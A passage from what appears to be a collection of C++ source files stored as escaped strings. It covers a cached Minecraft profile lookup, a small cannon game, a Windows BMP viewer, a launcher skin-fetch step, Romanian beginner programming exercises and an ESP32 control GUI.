invalid uuid\n        }\n    }\n    if (hex_chars < 32) return {};\n    return out;\n}\n\nstruct Profile {\n    std::string uuid;\n    std::string name;\n};\n\nstd::optional<Profile> parse_profile(const char* json_str) {\n    json_object *json = json_tokener_parse(json_str);\n    json_object *name_obj{};\n    json_object *id_obj{};\n    if (json_object_object_get_ex(json, \"name\", &name_obj) && json_object_object_get_ex(json, \"id\", &id_obj)) {\n        // if not valid uuid this throws exception\n        auto normal_uuid = normalize_uuid(json_object_get_string(id_obj)).value();\n        return {Profile{\n            .uuid = std::move(normal_uuid),\n            .name = json_object_get_string(name_obj),\n        }};\n    }\n    return {};\n}\n\nsize_t write_callback(char* data, size_t size, size_t nmemb, std::string* str) {\n    str->append(data, size * nmemb);\n    return size * nmemb;\n}\n\nstd::optional<Profile> fetch_profile(const char* url, std::string* error_out) {\n    CURL *curl = curl_easy_init();\n    assert(curl);\n    curl_easy_setopt(curl, CURLOPT_URL, url);\n    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);\n    std::string response;\n    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);\n    char error[CURL_ERROR_SIZE];\n    curl_easy_setopt(curl, CURLOPT_ERRORBUFFER, &error);\n    CURLcode res = curl_easy_perform(curl);\n    long http_code;\n    curl_easy_getinfo (curl, CURLINFO_RESPONSE_CODE, &http_code);\n    if (res != CURLE_OK) {\n        *error_out = error;\n        return {};\n    } else if (http_code == 200) {\n        return parse_profile(response.c_str());\n    } else {\n        *error_out = \"Mojang API returned http code \" + std::to_string(http_code);\n        return {};\n    }\n}\n\nstd::optional<Profile> fetch_profile_by_uuid(const char* uuid, std::string* error) {\n    std::string url = std::string{\"https://sessionserver.mojang.com/session/minecraft/profile/\"} + uuid;\n    return fetch_profile(url.c_str(), error);\n}\n\nstd::optional<Profile> fetch_profile_by_name(const char* name, std::string* error) {\n    std::string url = std::string{\"https://api.mojang.com/users/profiles/minecraft/\"} + name;\n    return fetch_profile(url.c_str(), error);\n}\n\nvoid update_cache(sqlite3* db, const char* uuid, const char* name, int64_t created_at) {\n    const char *sql = \"INSERT OR REPLACE INTO mc_profile_cache(uuid, name, created_at) VALUES(?, ?, ?)\";\n    sqlite3_stmt *stmt;\n    sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr);\n    sqlite3_bind_text(stmt, 1, uuid, -1, SQLITE_TRANSIENT);\n    sqlite3_bind_text(stmt, 2, name, -1, SQLITE_TRANSIENT);\n    sqlite3_bind_int64(stmt, 3, created_at);\n    sqlite3_step(stmt);\n    sqlite3_finalize(stmt);\n}\n\nvoid lookup0(sqlite3_context* ctx, const char* argument, bool uuid) {\n    sqlite3* db = sqlite3_context_db_handle(ctx);\n\n    auto fetch = uuid ? fetch_profile_by_uuid : fetch_profile_by_name;\n    const char *sql = uuid ?\n            \"SELECT name,uuid,created_at FROM mc_profile_cache WHERE uuid = ?\"\n            : \"SELECT name,uuid,created_at FROM mc_profile_cache WHERE name = ?\";\n    sqlite3_stmt *stmt;\n    sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr);\n    sqlite3_bind_text(stmt, 1, argument, -1, SQLITE_TRANSIENT);\n\n    int64_t now = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count();\n    constexpr int64_t millis_in_hour = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::hours{1}).count();\n    // Execute SQL statement\n    int err = sqlite3_step(stmt);\n    if (err == SQLITE_ROW) {\n        auto cached_name = (const char*) sqlite3_column_text(stmt, 0);\n        auto cached_uuid = (const char*) sqlite3_column_text(stmt, 1);\n        auto cached_result = uuid ? cached_name : cached_uuid;\n        int64_t created_at = sqlite3_column_int64(stmt, 2);\n        if (now - created_at < millis_in_hour) {\n            sqlite3_result_text(ctx, cached_result, strlen(cached_result), SQLITE_TRANSIENT);\n        } else {\n            std::string erro",
    "#pragma warning(disable: 4244; disable: 305)\n\n#include \"CannonGame.h\"\n\n#include \"Launcher.h\"\n\n#include <list>\n\n#include <Onyx/Core.h>\n#include <Onyx/Window.h>\n#include <Onyx/InputHandler.h>\n#include <Onyx/Math.h>\n\nusing namespace Onyx;\nusing namespace Onyx::Math;\n\nconst int SCR_WIDTH = 1280, SCR_HEIGHT = 720;\n\nconst int FLOOR_HEIGHT = 150;\nconst int CANNON_BODY_WIDTH = 100, CANNON_BODY_HEIGHT = 50;\nconst int CANNON_BARREL_WIDTH = 30, CANNON_BARREL_HEIGHT = 100;\n\nconst float BALL_SPAWN_INTERVAL = 0.1f;\nconst int BALL_RADIUS = 10, BALL_SEGMENTS = 5;\nconst float BALL_SPEED = 500.0f;\nconst float BALL_ROT_SPEED_MIN = 50.0f, BALL_ROT_SPEED_MAX = 200.0f;\n\nconst float BOULDER_OUTLINE_RATIO = 1.1f;\nconst float BOULDER_SPAWN_INTERVAL = 2.0f;\nconst int\tBOULDER_STARTING_HEALTH = 5, BOULDER_STARTING_RADIUS = 50, BOULDER_STARTING_SEGMENTS = 5;\nconst float BOUDLER_HEALTH_RANGE = 5, BOULDER_HEALTH_INC = 5;\nconst float BOULDER_RADIUS_RANGE = 25, BOULDER_RADIUS_INC = 0.3;\nconst float BOULDER_SEGMENTS_RANGE = 2.0f, BOULDER_SEGMENTS_INC = 0.02f;\nconst float BOULDER_VEL_MIN_X = 200.0f, BOULDER_VEL_MAX_X = 400.0f;\nconst float BOULDER_VEL_MIN_Y = 0.0f, BOULDER_VEL_MAX_Y = 50.0f;\nconst float BOULDER_ROT_SPEED_MIN = 20.0f, BOULDER_ROT_SPEED_MAX = 100.0f;\n\nconst float STRAFE_SPEED = 200.0f, STRAFE_RANGE = SCR_WIDTH / 2.0f - CANNON_BODY_WIDTH / 2.0f - 50.0f;\nconst float DAMAGE_INC = 0.25f;\n\nconst float BL_TEXT_PADDING = 20.0f, BL_TEXT_SCALE = 0.2f;\n\nconst float GRAVITY = -100.0f;\n\nvoid CannonGame::Run()\n{\n\tOnyx::Init();\n\n\tMonitor monitor = Monitor::GetPrimary();\n\n\tWindow window(\n\t\tWindowProperties{\n\t\t\t.title = \"Cannon\",\n\t\t\t.width = SCR_WIDTH,\n\t\t\t.height = SCR_HEIGHT,\n\t\t\t.nSamplesMSAA = 16,\n\t\t\t.backgroundColor = Vec3::LightBlue()\n\t\t}\n\t);\n\n\twindow.init();\n\twindow.setPosition(Vec2(monitor.getWidth() / 2 - SCR_WIDTH / 2, monitor.getHeight() / 2 - SCR_HEIGHT / 2));\n\n\tOnyx::WindowIcon icon = Onyx::WindowIcon::Load({\n\t\tOnyx::Resources(\"icons/icon-16x.png\"),\n\t\tOnyx::Resources(\"icons/icon-24x.png\"),\n\t\tOnyx::Resources(\"icons/icon-32x.png\"),\n\t\tOnyx::Resources(\"icons/icon-48x.png\"),\n\t\tOnyx::Resources(\"icons/icon-256x.png\")\n\t});\n\twindow.setIcon(icon);\n\ticon.dispose();\n\n\tCursor crosshair = Cursor::Standard(CursorType::Crosshair);\n\twindow.setCursor(crosshair);\n\n\tInputHandler input;\n\twindow.linkInputHandler(input);\n\n\tCamera cam(Projection::Orthographic(SCR_WIDTH, SCR_HEIGHT));\n\twindow.linkCamera(cam);\n\n\tRenderer renderer(cam);\n\twindow.linkRenderer(renderer);\n\n\tRenderable floor = Renderable::ColoredQuad(SCR_WIDTH, FLOOR_HEIGHT, Vec3(0.5f, 0.8f, 0.0f));\n\tfloor.translate(Vec3(SCR_WIDTH / 2, FLOOR_HEIGHT / 2, 0.0f));\n\trenderer.add(floor);\n\n\tRenderable cannonBodyRenderable = Renderable::ColoredQuad(100, 50, Vec3::Brown());\n\tcannonBodyRenderable.translate(Vec3(SCR_WIDTH / 2, FLOOR_HEIGHT + CANNON_BODY_HEIGHT / 2, 0.0f));\n\trenderer.add(cannonBodyRenderable);\n\n\tfloat vertices[12] = {\n\t\t-CANNON_BARREL_WIDTH / 2,    -CANNON_BARREL_HEIGHT / 4.0f, 0.0f,\n\t\t CANNON_BARREL_WIDTH / 2,    -CANNON_BARREL_HEIGHT / 4.0f, 0.0f,\n\t\t CANNON_BARREL_WIDTH / 2, 3 * CANNON_BARREL_HEIGHT / 4.0f, 0.0f,\n\t\t-CANNON_BARREL_WIDTH / 2, 3 * CANNON_BARREL_HEIGHT / 4.0f, 0.0f\n\t};\n\n\tRenderable cannonBarrelRenderable(\n\t\tMesh(\n\t\t\tVertexBuffer(vertices, sizeof(vertices), VertexFormat::P),\n\t\t\tIndexBuffer::Quad()\n\t\t),\n\t\tShader::P_Color(Vec4(Vec3::LightGray() * 0.65f, 1.0f))\n\t);\n\tcannonBarrelRenderable.translate(Vec3(SCR_WIDTH / 2, FLOOR_HEIGHT + CANNON_BODY_HEIGHT, 0.0f));\n\trenderer.add(cannonBarrelRenderable);\n\n\tRenderable cannonBallRenderable = Renderable::ColoredCircle(BALL_RADIUS, BALL_SEGMENTS, Vec4::Black());\n\n\tstd::list<CannonBall> cannonBalls;\n\tstd::list<Boulder> boulders;\n\n\tFont font = Font::Load(Resources(\"fonts/Poppins/Poppins-Bold.ttf\"), 256);\n\n\tTextRenderable3D nMissedText(\"0\", font, Vec4::Red(0.8f));\n\tnMissedText.setScale(BL_TEXT_SCALE);\n\tnMissedText.setPosition(Vec3(BL_TEXT_PADDING, BL_TEXT_PADDING, 0.1f));\n\n\tTextRenderable3D nDestroyedText(\"0\", font, Vec4::White(0.8f));\n\tnDestroyedText.setScale(BL_TEXT_SCALE);\n\tnDestroyedText.setPosition(Vec3(BL_TEXT_PADDING, BL_TEXT_PADDING + nMissedText.getHeight() + BL_TEXT_PADDING, 0.1f));\n\n\trenderer.add(nMissedText);\n\trenderer.add(nDestroyedText);\n\n\tVec3 colors[] = { Vec3::Red(), Vec3::Orange(), Vec3::Green(), Vec3::Blue(), Vec3::Cyan(), Vec3::Magenta(), Vec3::Pink(), Vec3::Purple(), Vec3::Brown() };\n\n\tfloat boulderSpawnTimer = 0.0f;\n\tfloat boulderHealthMin = BOULDER_STARTING_HEALTH, boulderRadiusMin = BOULDER_STARTING_RADIUS, boulderSegmentsMin = BOULDER_STARTING_SEGMENTS;\n\n\tfloat damage = 1.0f;\n\tbool ballRotEnabled = true;\n\n\tint nDestroyed = 0, nMissed = 0;\n\n\tfloat ballSpawnTimer = 0.0f;\n\n\twhile (window.isOpen())\n\t{\n\t\tdouble dt = window.getDeltaTime();\n\t\tboulderSpawnTimer += dt;\n\t\tballSpawnTimer += dt;\n\n\t\tif (boulderSpawnTimer >= BOULDER_SPAWN_INTERVAL)\n\t\t{\n\t\t\tboulderSpawnTimer = BOULDER_SPAWN_INTERVAL - boulderSpawnTimer;\n\n\t\t\tbool left = Rand<int>(0, 1);\n\t\t\tfloat rot = Rand<float>(0.0f, 360.0f);\n\t\t\tfloat rotStep = Rand<float>(BOULDER_RO",
    "\ufeff#include <windows.h>\n#include <commdlg.h>\n#include <string>\n#include <fstream>\n#include <vector>\n#include <iostream>\n#include <locale>\n#include <codecvt>\n\nusing namespace std;\n\n// \u0413\u043b\u043e\u0431\u0430\u043b\u044c\u043d\u044b\u0435 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u044b\u0435\nHBITMAP hBitmap = NULL;\n// \u041e\u043f\u0440\u0435\u0434\u0435\u043b\u0435\u043d\u0438\u0435 \u0438\u0434\u0435\u043d\u0442\u0438\u0444\u0438\u043a\u0430\u0442\u043e\u0440\u0430 \u043c\u0435\u043d\u044e\n#define IDM_OPEN 1001\n// \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u043e\u0442\u043a\u0440\u044b\u0442\u0438\u044f BMP \u0444\u0430\u0439\u043b\u0430 \u0447\u0435\u0440\u0435\u0437 \u0434\u0438\u0430\u043b\u043e\u0433\u043e\u0432\u043e\u0435 \u043e\u043a\u043d\u043e\n\n\n\nbool OpenBMPFile(HWND hWnd, wchar_t** selectedFile)\n{\n    OPENFILENAME ofn;\n    wchar_t szFile[MAX_PATH] = L\"\";\n\n    ZeroMemory(&ofn, sizeof(ofn));\n    ofn.lStructSize = sizeof(ofn);\n    ofn.hwndOwner = hWnd;\n    ofn.lpstrFilter = L\"BMP Files\\0*.bmp\\0\";\n    ofn.lpstrFile = szFile;\n    ofn.lpstrTitle = L\"\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 BMP \u0444\u0430\u0439\u043b\";\n    ofn.nMaxFile = sizeof(szFile);\n    ofn.Flags = OFN_FILEMUSTEXIST | OFN_PATHMUSTEXIST;\n\n    if (GetOpenFileName(&ofn))\n    {\n        *selectedFile = _wcsdup(szFile);\n        return true;\n    }\n\n    return 0;\n}\n\n\nstruct ImgInfo {\n    std::vector<COLORREF>* pixels;\n    int height, width, figXMin, figXMax, figYMin, figYMax;\n};\n\nImgInfo* readPixelColorsFromFile(const wchar_t* filename) {\n    ifstream file(filename, ios::binary);\n    vector<COLORREF>* pixelColors = new vector<COLORREF>();\n\n    if (file.is_open()) {\n        char* header = new char[54];\n        file.read(header, 54);\n\n        int width = *(int*)&header[18];\n        int height = *(int*)&header[22];\n\n        int dataSize = width * height * 3;\n\n        char* data = new char[dataSize];\n\n        file.read(data, dataSize);\n\n        COLORREF backgroundColor = RGB((unsigned char)data[2], (unsigned char)data[1], (unsigned char)data[0]);\n\n        int figXMin = width, figYMin = height, figXMax = 0, figYMax = 0;\n\n        for (int i = 0; i < dataSize; i += 3) {\n            COLORREF color = RGB((unsigned char)data[i + 2], (unsigned char)data[i + 1], (unsigned char)data[i]);\n            pixelColors->push_back(color);\n\n            if (color != backgroundColor) {\n                int currentX = (i / 3) % width;\n                int currentY = (i / 3) / width;\n\n                if (currentX < figXMin) figXMin = currentX;\n                if (currentX > figXMax) figXMax = currentX;\n                if (currentY < figYMin) figYMin = currentY;\n                if (currentY > figYMax) figYMax = currentY;\n            }\n        }\n\n        delete[] data;\n        delete[] header;\n\n        file.close();\n\n        for (COLORREF& color : *pixelColors) {\n            if (color == backgroundColor) {\n                color = RGB(255, 255, 255);\n            }\n        }\n\n        ImgInfo* info = new ImgInfo;\n        info->pixels = pixelColors;\n        info->height = height;\n        info->width = width;\n        info->figXMin = figXMin;\n        info->figXMax = figXMax;\n        info->figYMin = figYMin;\n        info->figYMax = figYMax;\n\n        return info;\n    }\n    return nullptr;\n}\n\nvoid DrawImage(const ImgInfo* imageInfo, HDC hdcWindow, HWND hwnd) {\n    int figWidth = imageInfo->figXMax - imageInfo->figXMin + 1;\n    int figHeight = imageInfo->figYMax - imageInfo->figYMin + 1;\n    std::vector<COLORREF>* pixelColors = imageInfo->pixels;\n\n    // \u0417\u0430\u043a\u0440\u0430\u0448\u0438\u0432\u0430\u0435\u043c \u043e\u043a\u043d\u043e \u0431\u0435\u043b\u044b\u043c\u0438 \u043f\u0438\u043a\u0441\u0435\u043b\u044f\u043c\u0438\n    HBRUSH whiteBrush = CreateSolidBrush(RGB(255, 255, 255));\n    RECT windowRect;\n    GetClientRect(hwnd, &windowRect);\n    FillRect(hdcWindow, &windowRect, whiteBrush);\n    DeleteObject(whiteBrush);\n\n    // \u0412\u044b\u0447\u0438\u0441\u043b\u044f\u0435\u043c \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u044b \u043e\u0442\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f \u0432 \u043f\u0440\u0430\u0432\u043e\u043c \u0446\u0435\u043d\u0442\u0440\u0435 \u043e\u043a\u043d\u0430\n    int windowCenterY = (windowRect.bottom - windowRect.top) / 2;\n    int positionX = windowRect.right - figWidth; // \u0420\u0430\u0441\u0447\u0451\u0442 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u044b X \u0434\u043b\u044f \u043e\u0442\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f \u0441 \u043f\u0440\u0430\u0432\u043e\u0439 \u0441\u0442\u043e\u0440\u043e\u043d\u044b\n    int positionY = windowCenterY - figHeight / 2; // \u0420\u0430\u0441\u0447\u0451\u0442 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u044b Y \u0434\u043b\u044f \u043e\u0442\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f \u0432 \u0432\u0435\u0440\u0442\u0438\u043a\u0430\u043b\u044c\u043d\u043e\u043c \u0446\u0435\u043d\u0442\u0440\u0435\n\n    for (int x = 0; x < figWidth; ++x) {\n        for (int y = 0; y < figHeight; ++y) {\n            int flippedX = x; // \u0437\u0435\u0440\u043a\u0430\u043b\u0438\u043c, \u0435\u0441\u043b\u0438 \u043d\u0443\u0436\u043d\u043e\n            int flippedY = figHeight - 1 - y;  // \u0437\u0435\u0440\u043a\u0430\u043b\u0438\u043c, \u0435\u0441\u043b\u0438 \u043d\u0443\u0436\u043d\u043e\n            SetPixel(hdcWindow, positionX + x, positionY + y, pixelColors->at((imageInfo->figYMin + flippedY) * imageInfo->width + imageInfo->figXMin + flippedX));\n        }\n    }\n}\n\n\n\n\n\n// \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0438 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0439\nLRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)\n{\n    static wchar_t* selectedFile = nullptr; // \u041e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u043e\u0439 selectedFile\n    static ImgInfo* info = nullptr; // \u041e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u043e\u0439 info\n    switch (msg)\n    {\n\n    case WM_COMMAND:\n        // \u041e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0430 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0439 \u043c\u0435\u043d\u044e\n        switch (LOWORD(wParam))\n        {\n        case IDM_OPEN:\n            // \u041e\u0442\u043a\u0440\u044b\u0442\u0438\u0435 BMP \u0444\u0430\u0439\u043b\u0430\n            if (OpenBMPFile(hwnd, &selectedFile))\n            {\n                info = readPixelColorsFromFile(selectedFile);\n                if (info)\n                {\n                    InvalidateRect(hwnd, NULL, TRUE);\n                }\n            }\n            break;\n        }\n        break;\n\n    case WM_PAINT:\n    {\n        PAINTSTRUCT ps;\n        HDC hdc = BeginPaint(hwnd, &ps); int height = LOWORD(lParam);\n        int width = HIWORD(lParam);\n        PaintRgn(hdc, CreateRectRg",
    "\n#include \"GetSkinStep.h\"\n\n#include <QNetworkRequest>\n\n#include \"minecraft/auth/AuthRequest.h\"\n#include \"minecraft/auth/Parsers.h\"\n\nGetSkinStep::GetSkinStep(AccountData* data) : AuthStep(data) {}\n\nGetSkinStep::~GetSkinStep() noexcept = default;\n\nQString GetSkinStep::describe()\n{\n    return tr(\"Getting skin.\");\n}\n\nvoid GetSkinStep::perform()\n{\n    auto url = QUrl(m_data->minecraftProfile.skin.url);\n    QNetworkRequest request = QNetworkRequest(url);\n    AuthRequest* requestor = new AuthRequest(this);\n    connect(requestor, &AuthRequest::finished, this, &GetSkinStep::onRequestDone);\n    requestor->get(request);\n}\n\nvoid GetSkinStep::rehydrate()\n{\n    // NOOP, for now.\n}\n\nvoid GetSkinStep::onRequestDone(QNetworkReply::NetworkError error, QByteArray data, QList<QNetworkReply::RawHeaderPair> headers)\n{\n    auto requestor = qobject_cast<AuthRequest*>(QObject::sender());\n    requestor->deleteLater();\n\n    if (error == QNetworkReply::NoError) {\n        m_data->minecraftProfile.skin.data = data;\n    }\n    emit finished(AccountTaskState::STATE_SUCCEEDED, tr(\"Got skin\"));\n}\n",
    "\ufeff#include \"HFolder.h\"\n\nvoid CE_LOOP_TEXT_(int intLocalTimes_,std::string sLocalText)\n{\n\tfor (int i = 0; i < intLocalTimes_; i++) {\n\t\tstd::cout << sLocalText << std::endl;\n\t}\n\n}\n\nbool CE_CURS_WHILE()\n{\n\n\tstd::cout << \"Mai acceleram? :\" << \" Da (1) \" << \"Nu (2)\" << std::endl;\n\n\tint input;\n\tstd:: cin >> input;\n\tbool rezultat;\n\n\tswitch (input) {\n\tcase 1:\n\t\trezultat = true;\n\t\tbreak;\n\tcase 2:\n\t\trezultat = false;\n\t\tbreak;\n\tdefault:\n\t\trezultat = false;\n\t\tbreak;\n\t}\n\treturn rezultat;\n\n}\n\nvoid CE_THROTTLE_()\n{\n\twhile (CE_CURS_WHILE()) {\n\t\tstd::cout << \" SPEEEEEED\" << std::endl;\n\t}\n}\n\nvoid CE_CURS_DO_WHILE_()\n{\n\n\tdo \n\t{\n\t\tstd::cout << \" Do this \" << std::endl;\n\t} while (false);\n\n}\n\n\n// TEME // \n\n\nvoid CE_TEMA_01_(int intLocalTimer)\n{\n\tfor (int i = intLocalTimer; i > 0; i--)\n\t{\n\t\tstd::cout << i << std::endl;\n\t\tstd::this_thread::sleep_for(std::chrono::seconds(1));\n\t\tif (i == 1) {\n\t\t\tstd::cout << \"Lansare!\" << std::endl;\n\t\t}\n\t}\n}\n\nvoid CE_TEMA_02_(int intLocalNumber)\n{\n\tint intRezultat_ = 0;\n\n\tfor (int i = 1; i <= intLocalNumber; i++)\n\t{\n\t\tstd::this_thread::sleep_for(std::chrono::milliseconds(75));\n\t\tstd::cout << i;\n\n\t\tintRezultat_ = intRezultat_ + i;\n\n\t\tif (i == intLocalNumber) {\n\t\t\tstd::cout << \" = \" << intRezultat_ << std::endl;\n\t\t}\n\t\telse {\n\t\t\tstd::this_thread::sleep_for(std::chrono::milliseconds(75));\n\t\t\tstd::cout << \" + \";\n\t\t}\n\t}\n}\n\nvoid CE_TEMA_03_(int intLocalLines)\n{\n\tfor (int i = 1; i <= intLocalLines; i++)\n\t{\n\t\t// Afiseaza spatiile pentru aliniere \u00een partea stanga\n\t\tfor (int s = 0; s < intLocalLines - i; s++) {\n\t\t\tstd::cout << \"  \";\n\t\t}\n\n\t\t// Afiseaza stelele pentru partea stanga a piramidei\n\t\tfor (int k = 0; k < i; k++) {\n\t\t\tstd::cout << \"* \";\n\t\t}\n\n\t\t// Afiseaza stelele pentru partea dreapta a piramidei\n\t\tfor (int k = i - 2; k >= 0; k--) {\n\t\t\tstd::cout << \"* \";\n\t\t}\n\t\tstd::cout << std::endl;\n\t}\n}\n\nint CE_TEMA_04_(int intLocalA, int intLocalB)\n{\n\t\tint intLocalC;\n\n\t\twhile (intLocalB)\n\t\t{\n\t\t\tintLocalC = intLocalA % intLocalB;\n\t\t\tintLocalA = intLocalB;\n\t\t\tintLocalB = intLocalC;\n\t\t}\n\t\treturn intLocalA;\n}\n\nbool CE_CHECK_PRIME_NUM_(int intLocalNumber) {\n\tif (intLocalNumber <= 1) {\n\t\treturn false;  // Numerele mai mici sau egale cu 1 nu sunt prime\n\t}\n\n\tint i = 2;\n\twhile (i * i <= intLocalNumber) {\n\t\tif (intLocalNumber % i == 0) {\n\t\t\treturn false;  // Daca gasim un divizor, numarul nu este prim\n\t\t}\n\t\t++i;\n\t}\n\n\treturn true;  // Daca nu gasim divizori, numarul este prim\n}\n\nvoid CE_TEMA_05_()\n{\n\tint intNumarAles = 0;\n\tstd::cout << \"Introduceti un numar: \";\n\tstd::cin >> intNumarAles;\n\tstd::cout << std::endl;\n\t\n\tif (CE_CHECK_PRIME_NUM_(intNumarAles)) {\n\t\tstd::cout << intNumarAles << \" este un numar prim\" << std::endl;\n\t}\n\telse {\n\t\tstd::cout << intNumarAles << \" nu este un numar prim\" << std::endl;\n\t}\n\n}\n\nvoid CE_TEMA_06_()\n{\n\tint intNumarDecimal = 0;\n\n\t// Citim num\u0103rul \u00een sistemul decimal de la utilizator\n\tstd::cout << \"Introduceti un numar in sistemul decimal: \";\n\tstd::cin >> intNumarDecimal;\n\n\t// Verificam cazul particular pentru numarul 0\n\tif (intNumarDecimal == 0) {\n\t\tstd::cout << \"Reprezentarea binara a numarului 0 este: 0\" << std::endl;\n\t}\n\telse {\n\t\t// Convertim numarul in sistemul binar utiliz\u00e2nd o bucla while\n\t\tstd::bitset<32> bitiBinary;  // Folosim 32 de biti pentru a acoperi un int standard\n\t\tint index = 0;\n\n\t\twhile (intNumarDecimal > 0) {\n\t\t\tbitiBinary[index] = intNumarDecimal % 2;\n\t\t\tintNumarDecimal /= 2;\n\t\t\t++index;\n\t\t}\n\n\t\t// Afisam rezultatul\n\t\tstd::cout << \"Reprezentarea binara a numarului este: \";\n\n\t\t// Afisam bitii in ordine inversa, de la cel mai semnificativ la cel mai putin semnificativ\n\t\tfor (int i = index - 1; i >= 0; --i) {\n\t\t\tstd::cout << bitiBinary[i];\n\t\t}\n\t}\n\tstd::cout << std::endl;\n}\n\n\nbool CE_CHECK_MAGIC_NUMBER_(int intLocalMagicNumber, int intLocalAINumber)\n{\n\tif (intLocalMagicNumber == intLocalAINumber) {\n\t\tstd::cout << \"Bravo ai gasit numarul magic !\" << std::endl;\n\t\treturn false;\n\t} else {\n\t\tstd::cout << \"Mai incearca, numarul nu este \" << intLocalMagicNumber << std::endl;\n\t\treturn true;\n\t}\n}\n\nvoid CE_TEMA_07_()\n{\n\tint intUserNumber = 0;\n\tint intUserTryes = 0;\n\tstd::random_device rd;\n\tstd::uniform_int_distribution<int> distribution(1, 3);\n\tunsigned short intAIChoice = distribution(rd);\n\n\tdo\n\t{\n\t\tstd::cout << \"Introdu numarul: \";\n\t\tstd::cin >> intUserNumber;\n\t\tstd::cout << std::endl;\n\t\tintUserTryes++;\n\t}\n\twhile (CE_CHECK_MAGIC_NUMBER_(intUserNumber, intAIChoice));\n\t\n\n\tstd::cout << \"Numarul era \" << intAIChoice << \", incercari: \" << intUserTryes << std::endl;\n}\n\nvoid CE_TEMA_08_()\n{\n\tchar cContinua;\n\tfloat fNumar1, fNumar2;\n\tchar cOperator;\n\n\tdo {\n\t\t// Citirea numerelor \u0219i a operatorului\n\t\tstd::cout << \"Introduceti primul numar: \";\n\t\tstd::cin >> fNumar1;\n\n\t\tstd::cout << \"Introduceti al doilea numar: \";\n\t\tstd::cin >> fNumar2;\n\n\t\tstd::cout << \"Introduceti operatorul (+, -, *, /): \";\n\t\tstd::cin >> cOperator;\n\n\t\t// Calculul si afisarea rezultatului\n\t\tswitch (cOperator) {\n\t\tcase '+':\n\t\t\tstd::cout << fNumar1 <<\" + \" << fNumar2 << \" = \" << fNumar1 + fNumar2 << std::endl;\n\t\t\tbreak;\n\t\tcase '-':\n\t\t\tstd::",
    "\n/******************************************************************************\n\n    C++ Script License - Version 1.0\n    Author: Gayan Brahmanage, Ph.D.\n    Contact: gayansampathefac@gmail.com\n    LinkedIn: https://www.linkedin.com/in/gayan-brahmanage/\n    GitHub: https://github.com/gayanbrahmanage\n\n    This C++ script is licensed under the terms of the MIT license. Please see\n    the following terms and conditions:\n\n    Permission is hereby granted, free of charge, to any person obtaining a copy\n    of this software and associated documentation files (the \"Software\"), to deal\n    in the Software without restriction, including without limitation the rights\n    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n    copies of the Software, and to permit persons to whom the Software is\n    furnished to do so, subject to the following conditions:\n\n    The above copyright notice and this permission notice shall be included in\n    all copies or substantial portions of the Software.\n\n    THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n    THE SOFTWARE.\n\n******************************************************************************/\n\n#include \"gui.h\"\n\nvoid gui::on_notification_from_thread_esp32(){\n\n  if(msg->auto_mode.read()){\n    sbtn_manual.update(true,\" Auto\", 0.7, 0.0, 0.0,20);\n  }else{\n    sbtn_manual.update(true,\" Manual\", 0.0, 0.7, 0.0,20);\n  }\n\n\n  if(msg->esp32message.set_brake1.read()){\n    sbtn_Brake1.update(true,\" Brake\", 0.7, 0.0, 0.0,10);\n    sbtn_Brake2.update(true,\" Brake\", 0.7, 0.0, 0.0,10);\n  }else{\n    sbtn_Brake1.update(false,\" Brake\", 0.0, 0.7, 0.0,10);\n    sbtn_Brake2.update(false,\" Brake\", 0.0, 0.7, 0.0,10);\n  }\n\n  std::ostringstream oss1;\n  oss1.width(4);\n  oss1.fill('0');\n  oss1 << msg->esp32message.set_speed1.read();\n  Message_Label1.set_text(\"Speed (rpm) \"+oss1.str());\n\n  std::ostringstream oss2;\n  oss2.width(4);\n  oss2.fill('0');\n  oss2 << msg->esp32message.set_speed2.read();;\n  Message_Label2.set_text(\"Speed (rpm) \"+oss2.str());\n\n  if(msg->esp32message.set_speed1.read()>0){\n      sbtn_Dir1.update(true,\"  DiR \", 0.0, 0.7, 0.0,13);\n  }else{\n      sbtn_Dir1.update(true,\"  DiR \", 0.7, 0.0, 0.0,13);\n  }\n\n  if(msg->esp32message.set_speed2.read()>0){\n      sbtn_Dir2.update(true,\"  DiR \", 0.0, 0.7, 0.0,13);\n  }else{\n      sbtn_Dir2.update(true,\"  DiR \", 0.7, 0.0, 0.0,13);\n  }\n\n  if(msg->esp32message.esp32_connected.read())\n    